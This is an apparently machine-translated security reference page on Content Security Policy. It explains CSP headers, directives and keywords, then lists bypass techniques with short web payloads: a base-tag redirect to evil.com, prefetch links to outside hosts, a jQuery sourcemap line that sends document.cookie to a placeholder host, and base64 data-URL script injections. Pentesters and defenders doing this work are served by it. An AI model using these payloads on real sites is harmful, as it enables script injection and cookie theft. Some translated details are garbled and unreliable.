CSP
========================================

What is CSP?
----------------------------------------
Content Security Policy, referred to as CSP, translated as content security policy. As the name suggests, this specification is related to content security. It is mainly used to define which resources can be loaded by the current page and reduce the occurrence of XSS.

Configuration
----------------------------------------
CSP policies can be defined through HTTP header information or meta elements.

There are three categories of CSPs:

- Content-Security-Policy  (Google Chrome)
- X-Content-Security-Policy (Firefox)
- X-WebKit-CSP (WebKit-based browsers, e.g. Safari)

::

    HTTP header :
    "Content-Security-Policy:" 策略
    "Content-Security-Policy-Report-Only:" 策略


The HTTP Content-Security-Policy header can specify that one or more resources are safe, while Content-Security-Policy-Report-Only allows the server to check (but not enforce) a policy. Policy definitions for multiple headers take precedence over the one defined first.

HTML Meta :
::

    <meta http-equiv="content-security-policy" content="策略">
    <meta http-equiv="content-security-policy-report-only" content="策略">


Instruction description
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

============    ============
Command Description
============    ============
default-src defines the default loading strategy for resources
connect-src defines loading strategies for Ajax, WebSocket, etc.
font-src defines Font loading strategy
frame-src defines Frame loading strategy
img-src defines image loading strategy
media-src defines the loading strategy for reference resources such as <audio> and <video>
object-src defines the loading strategy for reference resources such as <applet>, <embed>, and <object>
script-src defines JS loading strategy
style-src defines CSS loading strategy
base-uri defines <base> root URL policy, does not use default-src as the default value
The sandbox value is allow-forms, and sandbox is enabled for the resource.
report-uri value is /report-uri, submit log
============    ============

Keywords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``-``
    - Allow loading from any url except ``data:`` ``blob:`` ``filesystem:`` ``schemes``
    - e.g. ``img-src -``
- ``none``
    - Disable loading resources from any url
    - e.g. ``object-src 'none'``
- ``self``
    - Only resources from the same source can be loaded
    - e.g. ``img-src 'self'``
- ``data:``
    - Resources can be loaded through the data protocol
    - e.g. ``img-src 'self' data:``
- ``domain.example.com``
    - e.g. ``img-src domain.example.com``
    - Resources can only be loaded from specific domains
- ``\*.example.com``
    - e.g. ``img-src \*.example.com``
    - Can load resources from any subdomain of example.com
- ``https://cdn.com``
    - e.g. ``img-src https://cdn.com``
    - Can only load resources with https from a given domain
- ``https:``
    - e.g. ``img-src https:``
    - Only resources can be loaded using https from any domain
- ``unsafe-inline``
    - Allow internal resources to execute code such as style attributes, onclick or script tags
    - e.g. ``script-src 'unsafe-inline'``
- ``unsafe-eval``
    - Allow some unsafe code execution methods, such as js's eval()
    - e.g. ``script-src 'unsafe-eval'``
- ``nonce-<base64-value>'``
    - Use a random nonce to allow loading tags that match the nonce attribute on the tag
    - e.g. ``script-src 'nonce-bm9uY2U='``
- ``<hash-algo>-<base64-value>'``
    - Allow code blocks with matching hash values ​​to be executed
    - e.g. ``script-src 'sha256-<base64-value>'``

Configuration example
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Allows execution of inline JS code, but does not allow loading of external resources
::

    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';


Bypass
---------------------------------------

preload
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In order to enhance the user experience and make the browser more efficient, the browser has a preloading function, which generally uses the browser's idle time to load specified content and then caches it. This technology is further subdivided into DNS-prefetch, subresource, prefetch, preconnect, and prerender.

HTML5 page preloading is specified using the rel attribute of the link tag. If the csp header has unsafe-inline, you can use preloading to make requests to the outside world, for example

::

    <!-- 预加载某个页面 -->
    <link rel='prefetch' href='http://xxxx'><!-- firefox -->
    <link rel='prerender' href='http://xxxx'><!-- chrome -->
    <!-- 预加载某个图片 -->
    <link rel='prefetch' href='http://xxxx/x.jpg'>
    <!-- DNS 预解析 -->
    <link rel="dns-prefetch" href="http://xxxx">
    <!-- 特定文件类型预加载 -->
    <link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->

In addition, not all pages can be preloaded. When the resource type is as follows, the preloading operation will be blocked:

- The URL contains download resources
- The page contains audio and video
- ajax requests for POST, PUT and DELET operations
- HTTP authentication
- HTTPS page
- Pages containing malware
- Pop-up page
- Pages that take up a lot of resources
- Opened chrome developer tools development tools

MIME Sniff
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
For example, CSP prohibits cross-site reading of scripts, but cross-site reading of img is possible. Then pass an img containing a script and then ``<script href='http://xxx.com/xx.jpg'>``. Here csp thinks it is an img, bypassing the check. If the website does not return the correct mime type, the browser will guess and may load the img as a script.

302 jump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
For 302 jumps to bypass CSP, there are actually the following limitations:

- The springboard must be within a permitted domain.
- The host part of the file to be loaded must be consistent with the host part of the allowed domain

iframe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
When the code can be executed, you can create a frame whose source is static files such as ``css`` and ``js``. If the configuration is improper and there is no csp in the frame, create the frame again under the frame to achieve the purpose of bypass. In the same way, using ``../../../`` ``/%2e%2e%2f`` and other links that may trigger server errors can also achieve the corresponding purpose.

base-uri
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
When script-src is nonce or unlimited, and base-uri has no restrictions, you can bypass by modifying the root URL through the ``base`` tag. http://evil.com/main.js is loaded as follows.

::

    <base href="http://evil.com/">
    <script nonce="correct value" src="/main.js"></script>

other
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- location bypass
- When SVG can be uploaded, the same source site can be bypassed through malicious SVG
- When a CRLF vulnerability exists and the control point is above the CSP, it can be injected into the HTTP response to affect CSP parsing.
- CND Bypass, if the website trusts a certain CDN, then the static resource bypass of the corresponding CDN can be used
- Angular versions <1.5.9 >=1.5.0, there is a vulnerability `Git Pull Request <https://github.com/angular/angular.js/pull/15346>`_
- jQuery sourcemap 
    ::

        document.write(`<script>
        //@        sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);``
- ping attribute of a tag
- For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
- ``<link rel="import" />``
- ``<meta http-equiv="refresh" content="0; url=http://...." />``
- Only when restricting ``script-src``:
    - ``<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>``
